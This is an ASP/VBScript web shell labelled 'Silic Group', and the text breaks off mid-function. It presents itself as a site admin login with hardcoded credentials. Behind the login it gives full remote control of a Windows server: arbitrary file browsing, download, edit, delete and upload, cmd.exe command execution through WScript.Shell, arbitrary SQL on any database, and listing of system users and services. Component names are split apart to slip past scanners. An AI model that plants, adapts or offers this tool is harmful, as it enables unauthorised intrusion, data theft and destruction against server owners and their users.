<%@ LANGUAGE = VBScript %>
<%
server.scripttimeout=50000
response.buffer = true
on error resume next
silicname       = "admin"
silicpass       = "F4ck"  '登陆密码
silic           = "yeshackerok"
silic2          = "nohackerbad"
url             = request.servervariables("url")
serverip        = request.servervariables("local_addr")
action          = request("action")
rootpath        = server.mappath(".")
wwwroot         = server.mappath("/")
folderpath      = request("folderpath")
fname           = request("fname")
backurl         = "<meta http-equiv='refresh' content='2;url=?action=showfile'>"
if silicname<>"" then
if session("blackbap")<> silic then
  if request.form("pass")<>"" and request.form("name")<>"" then
    if request.form("name")=silicname and request.form("pass")=silicpass then
      silic2 = silic
      session("blackbap")=silic2
      response.redirect url
    else
	 response.write"验证失败！"
    end if
  else
    si="<center style='font-size:12px'><br><br>::Silic Group 网站后台管理系统::<br><br>"
    si=si&"<form action='"&url&"' method='post'>"
    si=si&"名称：<input name='name' type='input' size='15'>"
    si=si&"<br><br>"
    si=si&"密码：<input name='pass' type='password' size='15'>"
    si=si&"<br><br>"
    si=si&"&nbsp;<input type='submit' value='管理员登录'></form></center>"
    response.write si
  end if
  response.end
end if
end if
sub showerr()
  if err then
    response.write"<br><a href='javascript:history.back()'><br>&nbsp;" & err.description & "</a><br>"
    err.clear:response.flush
  end if		
end sub


dim obt(13,2)
obt(0,0) = "sc"&defd&"rip"&defd&"ting"&defd&".f"&defd&"iles"&defd&"yste"&defd&"mobj"&defd&"ect"
  obt(0,2) = "文件操作组件"
obt(1,0) = "w"&defd&"sc"&defd&"ri"&defd&"pt.s"&defd&"he"&defd&"ll"
  obt(1,2) = "命令行执行组件"
obt(2,0) = "adox.catalog"
  obt(2,2) = "access建库组件"
obt(3,0) = "jro.jetengine"
  obt(3,2) = "access压缩组件"
obt(4,0) = "scrip"&defd&"ting"&defd&".d"&defd&"icti"&defd&"onary" 
  obt(4,2) = "数据流上传辅助组件"
obt(5,0) = "adodb.connection"
  obt(5,2) = "数据库连接组件"
obt(6,0) = "ado"&defd&"d"&defd&"b"&defd&".s"&defd&"tre"&defd&"am"
  obt(6,2) = "数据流上传组件"
obt(7,0) = "softartisans.fileup"
  obt(7,2) = "sa-fileup 文件上传组件"
obt(8,0) = "lyfupload.uploadfile"
  obt(8,2) = "刘云峰文件上传组件"
obt(9,0) = "persits.upload.1"
  obt(9,2) = "aspupload 文件上传组件"
obt(10,0) = "jmail.smtpmail"
  obt(10,2) = "jmail 邮件收发组件"
obt(11,0) = "cdonts.newmail"
  obt(11,2) = "虚拟smtp发信组件"
obt(12,0) = "smtpmail.smtpmail.1"
  obt(12,2) = "smtpmail发信组件"
obt(13,0) = "microsoft.xmlhttp"
  obt(13,2) = "数据传输组件"

for i=0 to 13
	set t=server.createobject(obt(i,0))
	if -2147221005 <> err then
	  isobj=true
	else
	  isobj=false
	  err.clear
	end if
	set t=nothing
	obt(i,1)=isobj
next


function repath(s)
  repath=replace(s,"\","\\")
end function

function rrepath(s)
  rrepath=replace(s,"\\","\")
end function

if folderpath<>"" then
  session("folderpath")=rrepath(folderpath)
end if

if session("folderpath")="" then
  folderpath=rootpath
  session("folderpath")=folderpath
end if

function mainform()
  si="<form name=""hideform"" method=""post"" action="""&url&""" target=""fileframe"">"
  si=si&"<input type=""hidden"" name=""action"">"
  si=si&"<input type=""hidden"" name=""fname"">"
  si=si&"</form>"
  si=si&"<table width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0' bgcolor='menu'>"
  si=si&"<tr><td height='30' colspan='2'>"
  si=si&"<table width='100%' height='25'  border='0' cellpadding='0' cellspacing='0'>"
  si=si&"<form name='addrform' method='post' action='"&url&"' target='_parent'>"
  si=si&"<tr><td width='60' align='center'>地址栏：</td><td>"
  si=si&"<input name='folderpath' style='width:100%' value='"&session("folderpath")&"'>"
  si=si&"</td><td width='60' align='center'><input name='submit' type='submit' value='转到'>" 
  si=si&"</td></tr></form></table></td></tr><tr><td width='160'>"
  si=si&"<iframe name='left' src='?action=mainmenu' width='100%' height='100%' frameborder='2' scrolling='yes'></iframe></td>"
  si=si&"<td>"
  si=si&"<iframe name='fileframe' src='?action=showfile' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe>"
  si=si&"</td></tr></table>"
  response.write si
end function


function mainmenu()
  si="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
  si=si&"<tr><td height='5'></td></tr>"
  si=si&"<tr><td>&nbsp;"
  si=si&"fso文件操作模块"
  si=si&"</td></tr>"
  if not obt(0,1) then
    si=si&"<tr><td height='20'></td></tr>"
  else
  set abc=new lbf:si=si&abc.showdriver():set abc=nothing
  si=si&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  si=si&"<a href='javascript:showfolder(""c:\\progra~1"")'>c:\progra~1</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  si=si&"<a href='javascript:showfolder(""c:\\docume~1"")'>c:\docume~1</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  si=si&"<a href='javascript:showfolder("""&repath(wwwroot)&""")'>站点根目录</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  si=si&"<a href='javascript:showfolder("""&repath(rootpath)&""")'>本程序目录</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  si=si&"<a href='javascript:fullform("""&repath(session("folderpath")&"\newfolder")&""",""newfolder"")'>新建目录</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  si=si&"<a href='?action=editfile' target='fileframe'>新建文本</a>"
  si=si&"</td></tr>"
  end if
  response.write si:si=""
  
  si=si&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  si=si&"<a href='?action=upfile' target='fileframe'>文件上传模块</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;"
  si=si&"数据库操作模块"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  si=si&"<a href='javascript:fullform("""&repath(session("folderpath")&"\new.mdb")&""",""createmdb"")'>建立mdb文件</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  si=si&"<a href='?action=dbmanager' target='fileframe'>数据库操作</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  si=si&"<a href='javascript:fullform("""&repath(session("folderpath")&"\data.mdb")&""",""compactmdb"")'>压缩mdb文件</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;"
  si=si&"<a href='?action=cmdshell' target='fileframe'>命令行模块</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;"
  si=si&"<a href='?action=course' target='fileframe'>系统服务列表</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;"
  si=si&"<a href='?action=serverinfo' target='fileframe'>服务器信息</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;"
  si=si&"<a href='?action=logout' target='_top'>退出登录</a>"
  si=si&"</td></tr>"
  si=si&"<tr><td height='20'>&nbsp;"
  si=si&"<a href='http://www.blackbap.com/' target='_blank'>Silic Group</a>"
  si=si&"</td></tr>"  
  si=si&"<tr><td height='20'>"
  si=si&"<br>powered by YoCo Smart<br>&nbsp;QQ:364290237"
  si=si&"</td></tr>"
  si=si&"</table>"
  response.write si : si=""
end function

function course()
  si="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
  si=si&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>系统用户与服务</td></tr>"
  on error resume next
  for each obj in getobject("winnt://.")
  err.clear
  if obj.starttype="" then
  si=si&"<tr>"
  si=si&"<td height=""20"" bgcolor=""#ffffff"">&nbsp;"
  si=si&obj.name
  si=si&"</td><td bgcolor=""#ffffff"">&nbsp;" 
  si=si&"系统用户(组)"
  si=si&"</td></tr>"
  si0="<tr><td height=""20"" bgcolor=""#ffffff"" colspan=""2"">&nbsp;</td></tr>" 
  end if
  if obj.starttype=2 then lx="自动"
  if obj.starttype=3 then lx="手动"  
  if obj.starttype=4 then lx="禁用"
  if lcase(mid(obj.path,4,3))<>"win" and obj.starttype=2 then
  si1=si1&"<tr><td height=""20"" bgcolor=""#ffffff"">&nbsp;"&obj.name&"</td><td height=""20"" bgcolor=""#ffffff"">&nbsp;"&obj.displayname&"<tr><td height=""20"" bgcolor=""#ffffff"" colspan=""2"">[启动类型:"&lx&"]<font color=#ff0000>&nbsp;"&obj.path&"</font></td></tr>"
  else
  si2=si2&"<tr><td height=""20"" bgcolor=""#ffffff"">&nbsp;"&obj.name&"</td><td height=""20"" bgcolor=""#ffffff"">&nbsp;"&obj.displayname&"<tr><td height=""20"" bgcolor=""#ffffff"" colspan=""2"">[启动类型:"&lx&"]<font color=#008000>&nbsp;"&obj.path&"</font></td></tr>"
  end if
  next
  response.write si&si0&si1&si2&"</table>"
end function

function serverinfo()
  si="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
  si=si&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>服务器组件信息</td></tr>"
  si=si&"<tr align='center'><td height='20' width='200' bgcolor='#ffffff'>服务器名</td><td bgcolor='#ffffff'>&nbsp;</td><td bgcolor='#ffffff'>"&request.servervariables("server_name")&"</td></tr>"
  si=si&"<form method=post action='http://www.ip138.com/index.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#ffffff'>服务器ip</td><td bgcolor='#ffffff'>&nbsp;</td><td bgcolor='#ffffff'>"
  si=si&"<input type='text' name='ip' size='15' value='"&request.servervariables("local_addr")&"'style='border:0px'><input type='submit' value='查询'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form>"
  si=si&"<tr align='center'><td height='20' width='200' bgcolor='#ffffff'>服务器时间</td><td bgcolor='#ffffff'>&nbsp;</td><td bgcolor='#ffffff'>"&now&"&nbsp;</td></tr>"
  si=si&"<tr align='center'><td height='20' width='200' bgcolor='#ffffff'>服务器cpu数量</td><td bgcolor='#ffffff'>&nbsp;</td><td bgcolor='#ffffff'>"&request.servervariables("number_of_processors")&"</td></tr>"
  si=si&"<tr align='center'><td height='20' width='200' bgcolor='#ffffff'>服务器操作系统</td><td bgcolor='#ffffff'>&nbsp;</td><td bgcolor='#ffffff'>"&request.servervariables("os")&"</td></tr>"
  si=si&"<tr align='center'><td height='20' width='200' bgcolor='#ffffff'>web服务器版本</td><td bgcolor='#ffffff'>&nbsp;</td><td bgcolor='#ffffff'>"&request.servervariables("server_software")&"</td></tr>"
  for i=0 to 13
    si=si&"<tr align='center'><td height='20' width='200' bgcolor='#ffffff'>"&obt(i,0)&"</td><td bgcolor='#ffffff'>"&obt(i,1)&"</td><td bgcolor='#ffffff'>"&obt(i,2)&"</td></tr>"
  next
  response.write si
end function

function downfile(path)
  response.clear
  set osm = createobject(obt(6,0))
  osm.open
  osm.type = 1
  osm.loadfromfile path
  sz=instrrev(path,"\")+1
    response.addheader "content-disposition", "attachment; filename=" & mid(path,sz)
    response.charset = "utf-8"
    response.contenttype = "application/octet-stream"
    response.binarywrite osm.read
    response.flush
  osm.close
  set osm = nothing
end function


function htmlencode(s)
  if not isnull(s) then
    s = replace(s, ">", "&gt;")
    s = replace(s, "<", "&lt;")
    s = replace(s, chr(39), "&#39;")
    s = replace(s, chr(34), "&quot;")
    s = replace(s, chr(20), "&nbsp;")
    htmlencode = s
  end if
end function

function upfile()
  if request("action2")="post" then
    set u=new upc : set f=u.ua("localfile")
	uname=u.form("topath")
    if uname="" or f.filesize=0 then
      si="<br>请输入上传的完全路径后选择一个文件上传!"
    else
        f.saveas uname
        if err.number=0 then
          si="<center><br><br><br>文件"&uname&"上传成功！</center>"
		end if
	end if
	set f=nothing:set u=nothing
	si=si&backurl
	response.write si
	showerr()
	response.end
  end if
    si="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
    si=si&"<form name='upform' method='post' action='"&url&"?action=upfile&action2=post' enctype='multipart/form-data'>"
    si=si&"<tr><td>"
    si=si&"上传路径：<input name='topath' value='"&rrepath(session("folderpath")&"\newup.asp")&"' size='40'>&nbsp;"
    si=si&"<input name='localfile' type='file'  size='25'>"
    si=si&"<input type='submit' name='submit' value='上传'>"
    si=si&"</td></tr></form></table>"
  response.write si
end function

function cmdshell()
  if request("sp")<>"" then session("shellpath") = request("sp")
  shellpath=session("shellpath")
  if shellpath="" then shellpath = "cmd.exe"
  if request("wscript")="yes" then
  checked=" checked"
  else
  checked=""
  end if
  if request("cmd")<>"" then defcmd = request("cmd")
  si="<form method='post'><input name='cmd' style='width:92%' class='cmd' value='"&defcmd&"'><input type='submit' value='执行'>"
  si=si&"<textarea style='width:100%;height:500;' class='cmd'>"
  if request.form("cmd")<>"" then
  if request.form("wscript")="yes" then
  set cm=createobject(obt(1,0))
  set dd=cm.exec(shellpath&" /c "&defcmd)
  aaa=dd.stdout.readall
  si=si&aaa
  else%>
  <object runat=server id=ws scope=page classid="clsid:72c24dd5-d70a-438b-8a42-98424b88afb8"></object>
  <object runat=server id=ws scope=page classid="clsid:f935dc22-1cf0-11d0-adb9-00c04fd58a0b"></object>
  <object runat=server id=fso scope=page classid="clsid:0d43fe01-f093-11cf-8940-00a0c9054228"></object>
  <%sztempfile = server.mappath("cmd.txt")
  call ws.run (shellpath&" /c " & defcmd & " > " & sztempfile, 0, true)
  set fs = createobject("scripting.filesystemobject")
  set ofilelcx = fs.opentextfile (sztempfile, 1, false, 0)
  aaa=server.htmlencode(ofilelcx.readall)
  ofilelcx.close
  call fso.deletefile(sztempfile, true)
  si=si&aaa
  end if
  end if
  si=si&chr(13)&"</textarea>"
  si=si&"shell路径：<input name='sp' value='"&shellpath&"' style='width:70%'>&nbsp;&nbsp;"
  si=si&"<input type='checkbox' name='wscript' value='yes'"&checked&">wscript.shell</form>"
  response.write si
end function

function createmdb(path) 
   si="<br><br>"
   set c = createobject(obt(2,0)) 
   c.create("provider=microsoft.jet.oledb.4.0;data source=" & path)
   set c = nothing
   if err.number=0 then
     si = si & path & "建立成功!"
   end if
   si=si&backurl 
   response.write si
end function 

function compactmdb(path)
if not obt(0,1) then
    set c=createobject(obt(3,0)) 
      c.compactdatabase "provider=microsoft.jet.oledb.4.0;data source="&path&",provider=microsoft.jet.oledb.4.0;data source=" &path
	set c=nothing
else
  set fso=createobject(obt(0,1))
  if fso.fileexists(path) then
    set c=createobject(obt(3,0)) 
      c.compactdatabase "provider=microsoft.jet.oledb.4.0;data source="&path&",provider=microsoft.jet.oledb.4.0;data source=" &path&"_bak"
	set c=nothing
    fso.deletefile path
	fso.movefile path&"_bak",path
  else
    si="<center><br><br><br>数据库"&path&"没有发现！</center>" 
	err.number=1
  end if
  set fso=nothing
end if
  if err.number=0 then
    si="<center><br><br><br>数据库"&path&"压缩成功！</center>"
  end if
  si=si&backurl
  response.write si
end function


function dbmanager()
  sqlstr=trim(request.form("sqlstr"))
  dbstr=request.form("dbstr")

  si=si&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
  si=si&"<form name='dbform' method='post' action=''>"
  si=si&"<tr><td width='100' height='27'> &nbsp;数据库连接串:</td>"
  si=si&"<td><input name='dbstr' style='width:470' value="""&dbstr&"""></td>"
  si=si&"<td width='60' align='center'><select name='strbtn' onchange='return fulldbstr(options[selectedindex].value)'><option value=-1>连接串示例</option><option value=0>access连接</option>"
  si=si&"<option value=1>mssql连接</option><option value=2>mysql连接</option><option value=3>dsn连接</option>"
  si=si&"<option value=-1>--sql语法--</option><option value=4>显示数据</option><option value=5>添加数据</option>"
  si=si&"<option value=6>删除数据</option><option value=7>修改数据</option><option value=8>建数据表</option>"
  si=si&"<option value=9>删数据表</option><option value=10>添加字段</option><option value=11>删除字段</option>"
  si=si&"<option value=12>完全显示</option></select></td></tr>"
  si=si&"<input name='action' type='hidden' value='dbmanager'><input name='page' type='hidden' value='1'>"
  si=si&"<tr><td height='30'>&nbsp;sql操作命令:</td>"
  si=si&"<td><input name='sqlstr' style='width:470' value="""&sqlstr&"""></td>"
  si=si&"<td align='center'><input type='submit' name='submit' value='执行' onclick='return dbcheck()'></td>"
  si=si&"</tr></form></table><span id='abc'></span>"
  response.write si:si=""

  if len(dbstr)>40 then
  
  set conn=createobject(obt(5,0))
  conn.open dbstr
  set rs=conn.openschema(20) 
  si=si&"<table><tr height='25' bgcolor='#cccccc'><td>表<br>名</td>"
  rs.movefirst 
  do while not rs.eof
    if rs("table_type")="table" then
	  tname=rs("table_name")
      si=si&"<td align=center><a href='javascript:fullsqlstr(""drop table ["&tname&"]"",1)'>[ del ]</a><br>"
      si=si&"<a href='javascript:fullsqlstr(""select * from ["&tname&"]"",1)'>"&tname&"</a></td>"
    end if 
    rs.movenext 
  loop 
  set rs=nothing
  si=si&"</tr></table>"
  response.write si:si=""
	  
	  
	  
if len(sqlstr)>10 then

  if lcase(left(sqlstr,6))="select" then
    si=si&"执行语句："&sqlstr
    set rs=createobject("adodb.recordset")
    rs.open sqlstr,conn,1,1
    fn=rs.fields.count
    rc=rs.recordcount
    rs.pagesize=20
    count=rs.pagesize
    pn=rs.pagecount
    page=request("page")
    if page<>"" then page=clng(page)
    if page="" or page=0 then page=1
    if page>pn then page=pn
    if page>1 then rs.absolutepage=page
    si=si&"<table><tr height=25 bgcolor=#cccccc><td></td>"	  
    for n=0 to fn-1
      set fld=rs.fields.item(n)
      si=si&"<td align='center'>"&fld.name&"</td>"
      set fld=nothing
    next
    si=si&"</tr>"

    do while not(rs.eof or rs.bof) and count>0
	  count=count-1
	  bgcolor="#efefef"
	  si=si&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  for i=0 to fn-1
        if bgcolor="#efefef" then:bgcolor="#f5f5f5":else:bgcolor="#efefef":end if
        if rc=1 then
           colinfo=htmlencode(rs(i))
        else
           colinfo=htmlencode(left(rs(i),50))
        end if
	    si=si&"<td bgcolor="&bgcolor&">"&colinfo&"</td>"
	  next
	  si=si&"</tr>"
      rs.movenext
    loop
	
	response.write si:si=""
	
	sqlstr=htmlencode(sqlstr)

    si=si&"<tr><td colspan="&fn+1&" align=center>记录数："&rc&"&nbsp;页码："&page&"/"&pn
    if pn>1 then
      si=si&"&nbsp;&nbsp;<a href='javascript:fullsqlstr("""&sqlstr&""",1)'>首页</a>&nbsp;<a href='javascript:fullsqlstr("""&sqlstr&""","&page-1&")'>上一页</a>&nbsp;"
      if page>8 then:sp=page-8:else:sp=1:end if
      for i=sp to sp+8
        if i>pn then exit for
        if i=page then
        si=si&i&"&nbsp;"
        else
        si=si&"<a href='javascript:fullsqlstr("""&sqlstr&""","&i&")'>"&i&"</a>&nbsp;"
        end if
      next
	  si=si&"&nbsp;<a href='javascript:fullsqlstr("""&sqlstr&""","&page+1&")'>下一页</a>&nbsp;<a href='javascript:fullsqlstr("""&sqlstr&""","&pn&")'>尾页</a>"
    end if
    si=si&"<hr color='#efefef'></td></tr></table>"
    rs.close:set rs=nothing
	
	response.write si:si=""
  else	   
    conn.execute(sqlstr)
    si=si&"sql语句："&sqlstr
  end if

  response.write si:si=""
end if

  conn.close
  set conn=nothing
  end if
end function
%>
<head>
<meta http-equiv="content-type" content="text/html; charset=gb2312">
<title><%=serverip%></title>
<style type="text/css">
<!--
  body,td {font-size: 12px;}
  input,select{font-size: 12px;background-color:#ffffff;}
  .tr {background-color:#efefef;}
  .cmd {background-color:#000000;color:#ffffff}
  body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 0px;
    <%if action="" then response.write "overflow-x:hidden;overflow-y:hidden;"%>}
  a {color: black;text-decoration: none;}
  .am {color: #003366;font-size: 11px;}
-->
</style>
<script language="javascript">
<!--
  function yesok(){
    if (confirm("确认要执行此操作吗？"))
		return true;
	else
		return false;
    }

  function showfolder(folder){
    top.addrform.folderpath.value = folder;
    top.addrform.submit();
    }

  function fullform(fname,faction){
    top.hideform.fname.value = fname;
	if(faction=="copyfile"){
	    dname = prompt("请输入复制到目标文件全名称",fname);
	    top.hideform.fname.value += "||||"+dname;
	}else if(faction=="movefile"){
	    dname = prompt("请输入移动到目标文件全名称",fname);
	    top.hideform.fname.value += "||||"+dname;
    }else if(faction=="copyfolder"){
	    dname = prompt("请输入移动到目标文件夹全名称",fname);
	    top.hideform.fname.value += "||||"+dname;
    }else if(faction=="movefolder"){
	    dname = prompt("请输入移动到目标文件夹全名称",fname);
	    top.hideform.fname.value += "||||"+dname;
	}else if(faction=="newfolder"){
	    dname = prompt("请输入要新建的文件夹全名称",fname);
	    top.hideform.fname.value = dname;
	}else if(faction=="createmdb"){
	    dname = prompt("请输入要新建的mdb文件全名称,注意不能同名！",fname);
        top.hideform.fname.value = dname;
	}else if(faction=="compactmdb"){
	    dname = prompt("请输入要压缩的mdb文件全名称,注意文件是否存在！",fname);
        top.hideform.fname.value = dname;
	}else{
	    dname = "other"; 
	}
	
	if(dname!=null){
      top.hideform.action.value = faction;
      top.hideform.submit();
	}else{
      top.hideform.fname.value = "";
	}
  }
  
  function dbcheck(){
    if(dbform.dbstr.value == ""){
	  alert("请先连接数据库");
	  fulldbstr(0);
	  return false;
	}
	return true;
  }
  
  function fulldbstr(i){
   if(i<0){
     return false;
   }
    str = new array(12);  
	str[0] = "provider=microsoft.jet.oledb.4.0;data source=<%=repath(session("folderpath"))%>\\db.mdb;jet oledb:database password=***";
	str[1] = "driver={sql server};server=<%=serverip%>,1433;database=dbname;uid=sa;pwd=****";
	str[2] = "driver={mysql};server=<%=serverip%>;port=3306;database=dbname;uid=root;pwd=****";
	str[3] = "dsn=dsnname";
	str[4] = "select * from [tablename] where id<100";
	str[5] = "insert into [tablename](user,pass) values(\'username\',\'password\')";
	str[6] = "delete from [tablename] where id=100";
	str[7] = "update [tablename] set user=\'username\' where id=100";
	str[8] = "create table [tablename](id int identity (1,1) not null,user varchar(50))";
	str[9] = "drop table [tablename]";
	str[10]= "alter table [tablename] add column pass varchar(32)";
	str[11]= "alter table [tablename] drop column pass";
	str[12]= "当只显示一条数据时即可显示字段的全部字节，可用条件控制查询实现.\n超过一条数据只显示字段的前五十个字节。";
	if(i<=3){
	  dbform.dbstr.value = str[i];
	  dbform.sqlstr.value = "";
	  abc.innerhtml="<center>请确认己连接数据库再输入sql操作命令语句。</center>";
	}else if(i==12){
	  alert(str[i]);
	}else{
	  dbform.sqlstr.value = str[i];
	}
	return true;
  } 
  
  
  function fullsqlstr(str,pg){
    if(dbform.dbstr.value.length<5){
	  alert("请检查数据库连接串是否正确!")
	  return false;
	}
    if(str.length<10){
	  alert("请检查sql语句是否正确!")
	  return false;
	}
    dbform.sqlstr.value = str ;
	dbform.page.value = pg;
	abc.innerhtml="";
	dbform.submit();
    return true;
  }
-->
</script>
</head>
<%
dim t1
class upc
  dim d1,d2

  public function form(f)
    f=lcase(f)
    if d1.exists(f) then:form=d1(f):else:form="":end if
  end function

  public function ua(f)
    f=lcase(f)
    if d2.exists(f) then:set ua=d2(f):else:set ua=new fif:end if
  end function

  private sub class_initialize
  dim tda,tst,vbcrlf,tin,diend,t2,tlen,tfl,sfv,fstart,fend,dstart,dend,upname
    set d1=createobject(obt(4,0))
	if request.totalbytes<1 then exit sub
    set t1 = createobject(obt(6,0))
	t1.type = 1 : t1.mode =3 : t1.open
    t1.write  request.binaryread(request.totalbytes)
    t1.position=0 : tda =t1.read : dstart = 1
    dend = lenb(tda)
    set d2=createobject(obt(4,0))
	vbcrlf = chrb(13) & chrb(10)
    set t2 = createobject(obt(6,0))
    tst = midb(tda,1, instrb(dstart,tda,vbcrlf)-1)
    tlen = lenb (tst)
    dstart=dstart+tlen+1
    while (dstart + 10) < dend
      diend = instrb(dstart,tda,vbcrlf & vbcrlf)+3
      t2.type = 1 : t2.mode =3 : t2.open
      t1.position = dstart
      t1.copyto t2,diend-dstart
      t2.position = 0 : t2.type = 2 : t2.charset ="gb2312"
      tin = t2.readtext : t2.close
      dstart = instrb(diend,tda,tst)
      fstart = instr(22,tin,"name=""",1)+6
      fend = instr(fstart,tin,"""",1)
      upname = lcase(mid (tin,fstart,fend-fstart))
      if instr (45,tin,"filename=""",1) > 0 then
        set tfl=new fif
        fstart = instr(fend,tin,"filename=""",1)+10
        fend = instr(fstart,tin,"""",1)
        fstart = instr(fend,tin,"content-type: ",1)+14
        fend = instr(fstart,tin,vbcr)
        tfl.filestart =diend
        tfl.filesize = dstart -diend -3
        if not d2.exists(upname) then
          d2.add upname,tfl
        end if
      else
        t2.type =1 : t2.mode =3 : t2.open
        t1.position = diend : t1.copyto t2,dstart-diend-3
        t2.position = 0 : t2.type = 2
        t2.charset ="gb2312"
        sfv = t2.readtext
        t2.close
        if d1.exists(upname) then
          d1(upname)=d1(upname)&", "&sfv
        else
          d1.add upname,sfv
        end if
      end if
      dstart=dstart+tlen+1
    wend
    tda=""
    set t2 =nothing
  end sub
  
  private sub class_terminate
    if request.totalbytes>0 then
      d1.removeall:d2.removeall
      set d1=nothing:set d2=nothing
      t1.close:set t1 =nothing
    end if
  end sub
end class

class fif
dim filesize,filestart
  private sub class_initialize
  filesize = 0
  filestart= 0
  end sub
  
  public function saveas(f)
  dim t3
  saveas=true
  if trim(f)="" or filestart=0 then exit function
  set t3=createobject(obt(6,0))
     t3.mode=3 : t3.type=1 : t3.open
     t1.position=filestart
     t1.copyto t3,filesize
     t3.savetofile f,2
     t3.close
     set t3=nothing
     saveas=false
   end function
end class


class lbf
  dim cf
  private sub class_initialize
    set cf=createobject(obt(0,0))
  end sub

  private sub class_terminate
    set cf=nothing
  end sub

  function showdriver()
    for each d in cf.drives
      si=si&"<tr><td height='20'>&nbsp;&nbsp;"
      si=si&"<a href='javascript:showfolder("""&d.driveletter&":\\"")'>本地磁盘 ("&d.driveletter&":)</a>" 
      si=si&"</td></tr>"
    next
	showdriver=si
  end function

  function showfile(path)
  set fold=cf.getfolder(path)
  i=0
    si="<table width='100%'  border='0' cellspacing='0' cellpadding='0' bgcolor='#efefef'><tr>"
  for each f in fold.subfolders
    si=si&"<td height='20'>&nbsp;"
    si=si&" <a href='javascript:showfolder("""&repath(path&"\"&f.name)&""")'>"&f.name&"</a>" 
    si=si&" | <a href='javascript:fullform("""&replace(path&"\"&f.name,"\","\\")&""",""delfolder"")'  onclick='return yesok()' class='am' title='删除'>d</a>"
	si=si&" <a href='javascript:fullform("""&repath(path&"\"&f.name)&""",""copyfolder"")'  onclick='return yesok()' class='am' title='复制'>c</a>"
	si=si&" <a href='javascript:fullform("""&repath(path&"\"&f.name)&""",""movefolder"")'  onclick='return yesok()' class='am' title='移动'>m</a>"
	i=i+1
    if i mod 3 = 0 then si=si&"</tr><tr>"
  next
    si=si&"</tr><tr><td height=5></td></tr></table>"
	response.write si : si=""
  
  for each l in fold.files
    si="<table width='100%'  border='0' cellspacing='1' cellpadding='0'>"
    si=si&"<tr onmouseover=""this.classname='tr'"" onmouseout=""this.classname=''"">"
    si=si&"<td height='20'>&nbsp;"
	si=si&"<a href='javascript:fullform("""&repath(path&"\"&l.name)&""",""downfile"");' title='下载'>"&l.name&"</a></td>"
    si=si&"<td width='200'>"&l.type&"</td>"
    si=si&"<td width='50'>"&clng(l.size/1024)&"k</td>"
    si=si&"<td width='160'>"&l.datelastmodified&"</td>"
    si=si&"<td width='40' align=""center""><a href='javascript:fullform("""&repath(path&"\"&l.name)&""",""editfile"")' class='am' title='编辑'>edit</a></td>"
	si=si&"<td width='40' align=""center""><a href='javascript:fullform("""&repath(path&"\"&l.name)&""",""delfile"")'  onclick='return yesok()' class='am' title='删除'>del</a></td>"
	si=si&"<td width='40' align=""center""><a href='javascript:fullform("""&repath(path&"\"&l.name)&""",""copyfile"")' class='am' title='复制'>copy</a></td>"
	si=si&"<td width='40' align=""center""><a href='javascript:fullform("""&repath(path&"\"&l.name)&""",""movefile"")' class='am' title='移动'>move</a></td>"
    si=si&"</tr></table>"
	response.write si : si=""
  next
  set fold=nothing
  end function
  
  function delfile(path)
    if cf.fileexists(path) then
	  cf.deletefile path
      si="<center><br><br><br>文件 "&path&" 删除成功！</center>"
      si=si&backurl
	  response.write si
	end if
  end function
  
  function editfile(path)
  if request("action2")="post" then
      set t=cf.createtextfile(path)
        t.writeline request.form("content")
        t.close
      set t=nothing
    si="<center><br><br><br>文件保存成功！</center>"
    si=si&backurl
    response.write si
	response.end
  end if
  
  if path<>"" then
    set t=cf.opentextfile(path, 1, false)
    txt=htmlencode(t.readall) 
    t.close
    set t=nothing
  else
    path=session("folderpath")&"\newfile.asp":txt="新建文件"
  end if
  
  si="<table width='100%' height='100%'><tr><td valign='top' align='center'>"  
  si=si&"<form action='"&url&"?action2=post' method='post' name='editform'>"
  si=si&"<input name='action' value='editfile' type='hidden'>"
  si=si&"<input name='fname' value='"&path&"' style='width:100%'><br>"
  si=si&"<textarea name='content' style='width:100%;height:450'>"&txt&"</textarea><br>"
  si=si&"<hr><input name='goback' type='button' value='返回' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='重置'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='保存'></form>"
  si=si&"</td></tr></table></body></html>"
  response.write si
  end function
  
  function copyfile(path)
  path = split(path,"||||")
    if cf.fileexists(path(0)) and path(1)<>"" then
	  cf.copyfile path(0),path(1)
      si="<center><br><br><br>文件"&path(0)&"复制成功！</center>"
      si=si&backurl
	  response.write si 
	end if
  end function

  function movefile(path)
